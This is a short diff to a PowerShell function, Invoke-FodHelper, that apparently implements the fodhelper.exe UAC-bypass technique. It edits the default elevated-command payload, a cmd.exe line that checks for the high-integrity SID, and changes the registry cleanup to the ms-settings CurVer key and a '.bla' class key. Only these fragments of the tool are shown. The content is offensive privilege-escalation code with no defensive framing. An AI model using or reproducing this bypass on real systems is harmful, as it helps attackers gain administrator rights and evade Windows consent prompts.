@@ -18,7 +18,7 @@ function Invoke-FodHelper {
     Param
     (
         [Parameter(Mandatory = $false)]
-        [String]$program= "cmd.exe /c whoami /groups | find ""S-1-16-12288"" && Echo I am running elevated, so I must be an admin anyway ;-) || Echo I am not running elevanted :-(" #default
+        [String]$program= 'cmd.exe /c whoami /groups | find "S-1-16-12288" && Echo I am running elevated, so I must be an admin anyway ;-) || Echo I am not running elevanted :-('
     )
     Begin {
 		$me = whoami.exe
@@ -37,7 +37,7 @@ function Invoke-FodHelper {
 			Start-Sleep -s 1
 			Start-Process "C:\Windows\System32\fodhelper.exe"
 			Start-Sleep -s 1
-			Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+			Remove-Item "HKCU:\Software\Classes\ms-settings\CurVer" -Recurse -Force
 			Remove-Item "HKCU:\Software\Classes\.bla\" -Recurse -Force
 		}else
 		{
